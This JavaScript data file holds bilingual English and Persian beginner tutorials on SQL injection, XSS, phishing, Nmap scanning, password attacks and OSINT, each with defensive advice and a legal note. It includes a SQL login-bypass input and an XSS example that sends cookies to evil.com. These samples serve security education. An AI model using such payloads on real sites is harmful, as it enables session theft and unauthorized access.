const HACK_TUTORIALS = {
  sql: {
    en: {
      title: 'SQL Injection',
      meta: 'Beginner · Web Security · 15 min read',
      intro: 'SQL Injection (SQLi) is one of the oldest and most dangerous web vulnerabilities. It occurs when user input is inserted into SQL queries without proper sanitization, allowing attackers to manipulate database queries.',
      sections: [
        {
          title: 'Core Concept',
          body: 'Web applications use databases to store users, products, and sessions. When you log in, the app might run a query like: SELECT * FROM users WHERE username = \'input\' AND password = \'input\'. If the application builds this query by directly concatenating your input, an attacker can inject SQL code instead of normal text.',
        },
        {
          title: 'How the Attack Works',
          body: 'Imagine a login form. Instead of a username, the attacker enters: admin\' -- . The -- comments out the rest of the query, potentially logging in as admin without a password. Other payloads can extract entire databases, modify records, or bypass authentication entirely.',
        },
        {
          title: 'Types of SQL Injection',
          body: 'In-band SQLi: Results appear directly in the app response.\nBlind SQLi: No visible output — attacker infers data from timing or boolean responses.\nOut-of-band SQLi: Data exfiltrated via DNS or HTTP to an external server.\nUnion-based: Uses UNION SELECT to combine malicious queries with legitimate ones.',
        },
        {
          title: 'Real-World Impact',
          body: 'Successful SQLi can lead to full database dumps (usernames, passwords, credit cards), authentication bypass, data modification, and in some cases remote code execution on the database server.',
        },
        {
          title: 'Defense & Prevention',
          body: 'Use parameterized queries (prepared statements) — never concatenate user input into SQL.\nApply least-privilege database accounts.\nValidate and sanitize all input on the server side.\nUse Web Application Firewalls (WAF) as an additional layer.\nRegularly audit code and run automated SQLi scanners.',
        },
        {
          title: 'Legal & Ethical Note',
          body: 'Only test SQL injection on systems you own or have explicit written authorization to test. Unauthorized access to computer systems is illegal in virtually every jurisdiction.',
        },
      ],
    },
    fa: {
      title: 'SQL Injection',
      meta: 'مبتدی · امنیت وب · ۱۵ دقیقه مطالعه',
      intro: 'SQL Injection (SQLi) یکی از قدیمی‌ترین و خطرناک‌ترین آسیب‌پذیری‌های وب است. وقتی ورودی کاربر بدون sanitization مناسب در کوئری SQL قرار می‌گیرد، مهاجم می‌تواند کوئری را دستکاری کند.',
      sections: [
        {
          title: 'مفهوم اصلی',
          body: 'اپلیکیشن‌های وب از دیتابیس برای ذخیره کاربران، محصولات و session استفاده می‌کنند. هنگام لاگین، اپ ممکن است کوئری SELECT * FROM users WHERE username = \'input\' اجرا کند. اگر ورودی مستقیماً به کوئری چسبانده شود، مهاجم می‌تواند کد SQL تزریق کند.',
        },
        {
          title: 'نحوه حمله',
          body: 'فرض کنید فرم لاگین دارید. به‌جای نام کاربری، مهاجم وارد می‌کند: admin\' -- . علامت -- بقیه کوئری را comment می‌کند و ممکن است بدون رمز عبور وارد admin شود. payloadهای دیگر می‌توانند کل دیتابیس را استخراج یا احراز هویت را دور بزنند.',
        },
        {
          title: 'انواع SQL Injection',
          body: 'In-band: نتیجه مستقیم در پاسخ اپ نمایش داده می‌شود.\nBlind: خروجی visible نیست — مهاجم از timing یا پاسخ boolean استنتاج می‌کند.\nOut-of-band: داده از طریق DNS یا HTTP به سرور خارجی ارسال می‌شود.\nUnion-based: از UNION SELECT برای ترکیب کوئری مخرب با کوئری اصلی استفاده می‌شود.',
        },
        {
          title: 'تأثیر در دنیای واقعی',
          body: 'SQLi موفق می‌تواند منجر به dump کامل دیتابیس (رمزها، کارت بانکی)، دور زدن احراز هویت، تغییر داده و در برخی موارد اجرای کد روی سرور دیتابیس شود.',
        },
        {
          title: 'دفاع و پیشگیری',
          body: 'از parameterized query (prepared statement) استفاده کنید — هرگز ورودی را مستقیم در SQL نچسبانید.\nحساب دیتابیس با حداقل privilege.\nاعتبارسنجی ورودی سمت سرور.\nWAF به‌عنوان لایه اضافی.\nبازبینی کد و اسکن خودکار SQLi.',
        },
        {
          title: 'نکته قانونی و اخلاقی',
          body: 'فقط روی سیستم‌هایی که مالک هستید یا مجوز کتبی دارید تست کنید. دسترسی غیرمجاز در casi همه کشورها جرم است.',
        },
      ],
    },
  },

  xss: {
    en: {
      title: 'Cross-Site Scripting (XSS)',
      meta: 'Beginner · Web Security · 12 min read',
      intro: 'XSS allows attackers to inject malicious JavaScript into web pages viewed by other users. It exploits the trust a browser has in a website to execute attacker-controlled scripts in victims\' browsers.',
      sections: [
        {
          title: 'Core Concept',
          body: 'When a web application reflects or stores user input without encoding it properly, that input may be rendered as HTML/JavaScript in another user\'s browser. The victim\'s browser cannot distinguish between legitimate site scripts and injected malicious code.',
        },
        {
          title: 'Three Main Types',
          body: 'Reflected XSS: Malicious script is in the URL or form and immediately reflected in the response (one-time attack).\nStored XSS: Script is permanently saved on the server (comments, profiles) and executed for every visitor.\nDOM-based XSS: Vulnerability exists entirely in client-side JavaScript — server never sees the payload.',
        },
        {
          title: 'What Attackers Can Do',
          body: 'Steal session cookies and hijack accounts.\nCapture keystrokes and form data.\nRedirect users to phishing pages.\nDeface websites or spread malware.\nPerform actions on behalf of the victim (CSRF-like behavior).',
        },
        {
          title: 'Example Scenario',
          body: 'A forum stores comments without sanitization. Attacker posts: <script>fetch(\'https://evil.com?c=\'+document.cookie)</script>. Every user who views that comment sends their session cookie to the attacker.',
        },
        {
          title: 'Defense & Prevention',
          body: 'Encode all output based on context (HTML, JavaScript, URL, CSS).\nUse Content Security Policy (CSP) headers to restrict script sources.\nSet HttpOnly and Secure flags on cookies.\nUse modern frameworks that auto-escape by default.\nValidate input with allowlists, not blocklists.',
        },
        {
          title: 'Legal & Ethical Note',
          body: 'XSS testing must only be performed in authorized environments such as bug bounty programs, pentests with scope, or your own lab applications.',
        },
      ],
    },
    fa: {
      title: 'Cross-Site Scripting (XSS)',
      meta: 'مبتدی · امنیت وب · ۱۲ دقیقه مطالعه',
      intro: 'XSS به مهاجم اجازه می‌دهد JavaScript مخرب را در صفحاتی که کاربران دیگر می‌بینند تزریق کند. این آسیب‌پذیری از اعتماد مرورگر به سایت سوءاستفاده می‌کند.',
      sections: [
        {
          title: 'مفهوم اصلی',
          body: 'وقتی اپ ورودی کاربر را بدون encode مناسب reflect یا store کند، آن ورودی ممکن است به‌صورت HTML/JavaScript در مرورگر کاربر دیگر render شود. مرورگر نمی‌تواند اسکریپت شرعی و مخرب را تشخیص دهد.',
        },
        {
          title: 'سه نوع اصلی',
          body: 'Reflected XSS: اسکریپت در URL یا فرم است و فوراً در پاسخ برمی‌گردد.\nStored XSS: اسکریپت روی سرور ذخیره می‌شود (نظرات، پروفایل) و برای هر بازدیدکننده اجرا می‌شود.\nDOM-based XSS: آسیب‌پذیری کاملاً در JavaScript سمت کلاینت است.',
        },
        {
          title: 'کارهای مهاجم',
          body: 'دزدیدن session cookie و تصاحب حساب.\nضبط keystroke و داده فرم.\nredirect به صفحات فیشینگ.\nDeface سایت یا spread بدافزار.\nانجام عملیات به‌جای قربانی.',
        },
        {
          title: 'سناریوی نمونه',
          body: 'فروم نظرات را بدون sanitization ذخیره می‌کند. مهاجم می‌نویسد: <script>fetch(\'https://evil.com?c=\'+document.cookie)</script>. هر کاربری که نظر را ببیند cookie خود را برای مهاجم می‌فرستد.',
        },
        {
          title: 'دفاع و پیشگیری',
          body: 'encode خروجی بر اساس context (HTML، JS، URL).\nاستفاده از CSP header.\nHttpOnly و Secure روی cookie.\nفریم‌ورک‌های مدرن با auto-escape.\nاعتبارسنجی با allowlist.',
        },
        {
          title: 'نکته قانونی و اخلاقی',
          body: 'تست XSS فقط در محیط‌های مجاز مثل bug bounty، pentest با scope یا lab شخصی مجاز است.',
        },
      ],
    },
  },

  phishing: {
    en: {
      title: 'Phishing & Social Engineering',
      meta: 'Beginner · Human Layer · 10 min read',
      intro: 'Phishing attacks target the human element of security — the weakest link in any system. Instead of exploiting code, attackers manipulate people into revealing credentials or taking harmful actions.',
      sections: [
        {
          title: 'Core Concept',
          body: 'Social engineering is the art of manipulating people into breaking security procedures. Phishing is the most common form: fraudulent emails, messages, or websites that impersonate trusted entities to steal sensitive information.',
        },
        {
          title: 'Common Phishing Techniques',
          body: 'Email phishing: Mass emails mimicking banks, PayPal, or IT departments.\nSpear phishing: Targeted attacks on specific individuals using personal information.\nWhaling: Attacks on executives and high-value targets.\nSmishing & Vishing: Phishing via SMS or voice calls.\nClone phishing: Duplicating legitimate emails with malicious links.',
        },
        {
          title: 'Psychological Triggers',
          body: 'Attackers exploit urgency ("Your account will be closed!"), authority (fake CEO emails), curiosity ("You have a package"), fear (legal threats), and trust (spoofed sender addresses). These bypass rational security thinking.',
        },
        {
          title: 'How to Recognize Phishing',
          body: 'Check sender email carefully — look for subtle misspellings.\nHover over links before clicking — URL may differ from displayed text.\nBe suspicious of urgent requests for passwords or payments.\nLook for generic greetings ("Dear Customer") instead of your name.\nWhen in doubt, contact the organization through official channels.',
        },
        {
          title: 'Defense for Organizations',
          body: 'Conduct regular phishing simulation training.\nImplement email authentication (SPF, DKIM, DMARC).\nUse multi-factor authentication (MFA) everywhere.\nEstablish clear reporting procedures for suspicious emails.\nCreate a security-aware culture, not just policies.',
        },
        {
          title: 'Legal & Ethical Note',
          body: 'Phishing simulations require employee consent and organizational authorization. Creating phishing pages to attack real users without permission is a criminal offense.',
        },
      ],
    },
    fa: {
      title: 'فیشینگ و مهندسی اجتماعی',
      meta: 'مبتدی · لایه انسانی · ۱۰ دقیقه مطالعه',
      intro: 'فیشینگ عنصر انسانی امنیت را هدف می‌گیرد — ضعیف‌ترین حلقه هر سیستم. به‌جای exploit کد، مهاجم مردم را وادار به افشای credential یا اقدامات مضر می‌کند.',
      sections: [
        {
          title: 'مفهوم اصلی',
          body: 'مهندسی اجتماعی هنر manipulat کردن مردم برای نقض رویه‌های امنیتی است. فیشینگ رایج‌ترین شکل است: ایمیل، پیام یا سایت جعلی که خود را جای نهاد معتبر جا می‌زند.',
        },
        {
          title: 'تکنیک‌های رایج فیشینگ',
          body: 'Email phishing: ایمیل انبوه جعل بانک یا IT.\nSpear phishing: حمله هدفمند با اطلاعات شخصی.\nWhaling: حمله به مدیران ارشد.\nSmishing و Vishing: فیشینگ SMS یا تماس.\nClone phishing: کپی ایمیل واقعی با لینک مخرب.',
        },
        {
          title: 'محرک‌های روانی',
          body: 'مهاجمان از فوریت («حساب شما بسته می‌شود»)، authority (ایمیل جعلی CEO)، کنجکاوی، ترس و اعتماد (جعل آدرس فرستنده) سوءاستفاده می‌کنند.',
        },
        {
          title: 'تشخیص فیشینگ',
          body: 'ایمیل فرستنده را دقیق بررسی کنید.\nقبل از کلیک روی لینک hover کنید.\nدرخواست فوری رمز یا پرداخت مشکوک است.\nسلام عمومی («مشتری عزیز») به‌جای نام شما.\nدر شک، از کانال رسمی سازمان تماس بگیرید.',
        },
        {
          title: 'دفاع سازمانی',
          body: 'آموزش و شبیه‌سازی فیشینگ منظم.\nSPF، DKIM، DMARC.\nMFA همه‌جا.\nرویه گزارش ایمیل مشکوک.\nفرهنگ امنیتی، نه فقط policy.',
        },
        {
          title: 'نکته قانونی و اخلاقی',
          body: 'شبیه‌سازی فیشینگ نیاز به رضایت کارکنان و مجوز سازمان دارد. ساخت صفحه فیشینگ برای حمله به کاربران واقعی بدون مجوز جرم است.',
        },
      ],
    },
  },

  nmap: {
    en: {
      title: 'Network Scanning with Nmap',
      meta: 'Intermediate · Network · 14 min read',
      intro: 'Nmap (Network Mapper) is the industry-standard tool for network discovery and security auditing. It reveals live hosts, open ports, running services, and operating systems on a network.',
      sections: [
        {
          title: 'Core Concept',
          body: 'Before attacking a network, you must map it. Nmap sends crafted packets to target hosts and analyzes responses to determine what is running, which ports are open, and what services are listening. This reconnaissance phase is critical in every pentest.',
        },
        {
          title: 'How Scanning Works',
          body: 'Nmap sends TCP, UDP, or ICMP packets to target IP addresses and ports. Open ports respond differently than closed or filtered ports. By analyzing response timing, flags, and content, Nmap builds a map of the target\'s attack surface.',
        },
        {
          title: 'Essential Scan Types (Conceptual)',
          body: 'Host discovery (-sn): Find which IPs are alive on a network.\nPort scan (-sS SYN scan): Fast, semi-stealthy TCP scan.\nService detection (-sV): Identify software and version on open ports.\nOS detection (-O): Fingerprint the operating system.\nScript scan (-sC): Run NSE scripts for vulnerability checks.',
        },
        {
          title: 'Reading Results',
          body: 'Open: Port accepts connections — potential entry point.\nClosed: Port reachable but no service listening.\nFiltered: Firewall blocking probe — may need different technique.\nService/version info helps identify known CVEs for that software version.',
        },
        {
          title: 'Defensive Perspective',
          body: 'Close unnecessary ports and services.\nUse firewalls to filter unsolicited inbound traffic.\nDeploy IDS/IPS to detect scan patterns.\nRegularly scan your own network to find exposures before attackers do.\nKeep services patched and updated.',
        },
        {
          title: 'Legal & Ethical Note',
          body: 'Scanning networks you do not own or lack authorization to test is illegal. Always obtain written permission before scanning any network outside your lab.',
        },
      ],
    },
    fa: {
      title: 'اسکن شبکه با Nmap',
      meta: 'متوسط · شبکه · ۱۴ دقیقه مطالعه',
      intro: 'Nmap (Network Mapper) ابزار استاندارد صنعت برای کشف شبکه و audit امنیتی است. hostهای زنده، portهای باز، سرویس‌ها و سیستم‌عامل را نشان می‌دهد.',
      sections: [
        {
          title: 'مفهوم اصلی',
          body: 'قبل از حمله به شبکه باید آن را map کنید. Nmap packet ساختگی به hostهای هدف می‌فرستد و پاسخ را تحلیل می‌کند. این فاز reconnaissance در هر pentest حیاتی است.',
        },
        {
          title: 'نحوه اسکن',
          body: 'Nmap packet TCP، UDP یا ICMP به IP و port هدف می‌فرستد. port باز متفاوت از بسته یا filtered پاسخ می‌دهد. با تحلیل timing، flag و محتوا، map سطح حمله ساخته می‌شود.',
        },
        {
          title: 'انواع اسکن (مفهومی)',
          body: 'Host discovery (-sn): یافتن IPهای زنده.\nPort scan (-sS): اسکن SYN سریع.\nService detection (-sV): شناسایی نرم‌افزار و نسخه.\nOS detection (-O): fingerprint سیستم‌عامل.\nScript scan (-sC): اجرای NSE script.',
        },
        {
          title: 'خواندن نتایج',
          body: 'Open: port اتصال می‌پذیرد — نقطه ورود احتمالی.\nClosed: reachable اما سرویس listening نیست.\nFiltered: فایروال probe را block کرده.\nاطلاعات version برای CVEهای شناخته‌شده مفید است.',
        },
        {
          title: 'دیدگاه دفاعی',
          body: 'بستن port و سرویس غیرضروری.\nفایروال برای traffic ورودی.\nIDS/IPS برای تشخیص الگوی اسکن.\nاسکن منظم شبکه خودتان.\npatch سرویس‌ها.',
        },
        {
          title: 'نکته قانونی و اخلاقی',
          body: 'اسکن شبکه بدون مالکیت یا مجوز غیرقانونی است. همیشه قبل از اسcan خارج از lab مجوز کتبی بگیرید.',
        },
      ],
    },
  },

  password: {
    en: {
      title: 'Password Attacks',
      meta: 'Intermediate · Authentication · 13 min read',
      intro: 'Weak passwords remain one of the most exploited attack vectors. Understanding how password attacks work helps you build stronger authentication systems and protect user credentials.',
      sections: [
        {
          title: 'Core Concept',
          body: 'Password attacks attempt to discover or bypass authentication credentials. They range from guessing common passwords to cracking stolen password hashes offline. The math is simple: if passwords are weak or hashes are poorly stored, they will fall.',
        },
        {
          title: 'Attack Methods',
          body: 'Brute force: Try every possible combination (slow but thorough).\nDictionary attack: Try common words and leaked password lists.\nRainbow tables: Precomputed hash tables for instant lookup.\nCredential stuffing: Reuse leaked username/password pairs from other breaches.\nPass-the-hash: Use captured NTLM hashes without knowing the plaintext password.',
        },
        {
          title: 'How Hashing Works',
          body: 'Websites should never store plaintext passwords. Instead, they store hashes — one-way mathematical functions. When you log in, your input is hashed and compared. However, if the hash algorithm is weak (MD5, SHA1) or lacks salt, attackers can crack hashes offline rapidly using GPUs.',
        },
        {
          title: 'Strong Password Principles',
          body: 'Length beats complexity — passphrases of 16+ characters are ideal.\nNever reuse passwords across sites.\nUse a password manager to generate unique passwords.\nEnable MFA — even a stolen password alone won\'t grant access.\nPrefer bcrypt, scrypt, or Argon2 for password hashing with unique salts.',
        },
        {
          title: 'Defense for Developers',
          body: 'Use slow, salted hashing algorithms (bcrypt, Argon2).\nImplement account lockout and rate limiting on login.\nMonitor for credential stuffing with breach detection services.\nForce MFA for sensitive accounts.\nNever store or log plaintext passwords.',
        },
        {
          title: 'Legal & Ethical Note',
          body: 'Cracking passwords on systems you don\'t own is illegal. Password security research should be done in isolated lab environments with your own test accounts.',
        },
      ],
    },
    fa: {
      title: 'حملات رمز عبور',
      meta: 'متوسط · احراز هویت · ۱۳ دقیقه مطالعه',
      intro: 'رمزهای ضعیف همچنان یکی از exploitedترین بردارهای حمله هستند. درک نحوه کار حملات رمز عبور به ساخت سیستم احراز هویت قوی‌تر کمک می‌کند.',
      sections: [
        {
          title: 'مفهوم اصلی',
          body: 'حملات رمز عبور تلاش برای کشف یا دور زدن credential احراز هویت دارند. از حدس رمزهای رایج تا crack hash آفلاین. اگر رمز ضعیف یا hash بد ذخیره شده باشد، شکسته می‌شود.',
        },
        {
          title: 'روش‌های حمله',
          body: 'Brute force: امتحان همه ترکیب‌ها.\nDictionary attack: کلمات رایج و لیست leak.\nRainbow table: جدول hash از پیش محاسبه‌شده.\nCredential stuffing: reuse جفت user/pass از breach دیگر.\nPass-the-hash: استفاده از hash NTLM بدون plaintext.',
        },
        {
          title: 'نحوه Hashing',
          body: 'سایت‌ها نباید plaintext ذخیره کنند. hash — تابع یک‌طرفه — ذخیره می‌شود. اگر الگوریتم ضعیف (MD5) یا بدون salt باشد، مهاجم با GPU سریع crack می‌کند.',
        },
        {
          title: 'اصول رمز قوی',
          body: 'طول مهم‌تر از پیچیدگی — passphrase ۱۶+ کاراکتر.\nهرگز reuse نکنید.\nPassword manager.\nMFA فعال کنید.\nbcrypt، scrypt یا Argon2 با salt یکتا.',
        },
        {
          title: 'دفاع برای توسعه‌دهندگان',
          body: 'Hashing کند و salted.\nLockout و rate limit روی login.\nMonitoring credential stuffing.\nMFA برای حساب حساس.\nهرگز plaintext log یا store نکنید.',
        },
        {
          title: 'نکته قانونی و اخلاقی',
          body: 'Crack رمز روی سیستم غیرمجاز illegal است. تحقیق فقط در lab ایزوله با حساب تست خودتان.',
        },
      ],
    },
  },

  osint: {
    en: {
      title: 'OSINT Reconnaissance',
      meta: 'Beginner · Intelligence · 11 min read',
      intro: 'OSINT (Open Source Intelligence) is gathering information from publicly available sources. In cybersecurity, it\'s the first phase of any operation — mapping the target before sending a single attack packet.',
      sections: [
        {
          title: 'Core Concept',
          body: 'Every organization leaks information: domain registrations, employee LinkedIn profiles, GitHub repos with API keys, DNS records, job postings revealing tech stacks, and cached web pages. OSINT collects and correlates this data to build a target profile.',
        },
        {
          title: 'What You Can Discover',
          body: 'Subdomains and IP ranges via DNS and certificate transparency logs.\nEmployee names, emails, and roles from social media.\nTechnology stack from job listings and HTTP headers.\nExposed documents and metadata in public file shares.\nHistorical website versions showing old vulnerabilities.',
        },
        {
          title: 'The OSINT Methodology',
          body: '1. Define scope — what are you looking for?\n2. Collect — gather data from search engines, WHOIS, Shodan, social media.\n3. Analyze — correlate findings, identify patterns and weak points.\n4. Report — document attack surface for next phases.\nPassive OSINT sends no traffic to the target — completely stealthy.',
        },
        {
          title: 'Popular OSINT Sources (Conceptual)',
          body: 'Search engines (Google dorking): site:, filetype:, inurl: operators.\nWHOIS & DNS records: Domain ownership and infrastructure.\nShodan/Censys: Internet-connected device search engines.\nSocial media: LinkedIn, Twitter for employee and tech info.\nGitHub/GitLab: Accidentally committed secrets and source code.',
        },
        {
          title: 'Defensive OSINT',
          body: 'Audit your public footprint regularly — Google yourself and your company.\nRemove unnecessary public information from social profiles.\nUse email aliases and separate work/personal accounts.\nMonitor certificate transparency and subdomain registrations.\nTrain employees not to overshare organizational details online.',
        },
        {
          title: 'Legal & Ethical Note',
          body: 'OSINT uses only public data, but combining it to harass, stalk, or attack individuals without authorization crosses legal boundaries. Always operate within scope and applicable privacy laws.',
        },
      ],
    },
    fa: {
      title: 'شناسایی OSINT',
      meta: 'مبتدی · اطلاعات · ۱۱ دقیقه مطالعه',
      intro: 'OSINT (Open Source Intelligence) جمع‌آوری اطلاعات از منابع عمومی است. در امنیت سایber، اولین فاز هر عملیات — map هدف قبل از ارسال یک packet حمله.',
      sections: [
        {
          title: 'مفهوم اصلی',
          body: 'هر سازمان اطلاعات leak می‌کند: ثبت دامنه، LinkedIn کارمندان، GitHub با API key، DNS، آگهی شغلی با tech stack، صفحات cache. OSINT این داده را جمع و correlate می‌کند.',
        },
        {
          title: 'چه چیزهایی قابل کشف است',
          body: 'Subdomain و IP از DNS و certificate transparency.\nنام، ایمیل و نقش کارمند از social media.\nTech stack از آگهی و HTTP header.\nسند exposed در file share عمومی.\nنسخه تاریخی سایت با آسیب‌پذیری قدیمی.',
        },
        {
          title: 'متدولوژی OSINT',
          body: '۱. تعریف scope.\n۲. جمع‌آوری از موتور جستجو، WHOIS، Shodan.\n۳. تحلیل و correlate.\n۴. گزارش attack surface.\nOSINT passive هیچ traffic به هدف نمی‌فرستد — کاملاً stealth.',
        },
        {
          title: 'منابع OSINT (مفهومی)',
          body: 'Google dorking: site:, filetype:, inurl:.\nWHOIS و DNS.\nShodan/Censys.\nLinkedIn، Twitter.\nGitHub/GitLab برای secret commit شده.',
        },
        {
          title: 'OSINT دفاعی',
          body: 'Audit منظم footprint عمومی.\nحذف اطلاعات غیرضروری از profile.\nEmail alias.\nMonitor certificate transparency.\nآموزش کارکنان برای overshare نکردن.',
        },
        {
          title: 'نکته قانونی و اخلاقی',
          body: 'OSINT فقط داده عمومی است، اما ترکیب آن برای harass یا حمله بدون مجوز مرز قانونی را رد می‌کند. همیشه در scope و قوانین privacy عمل کنید.',
        },
      ],
    },
  },
};
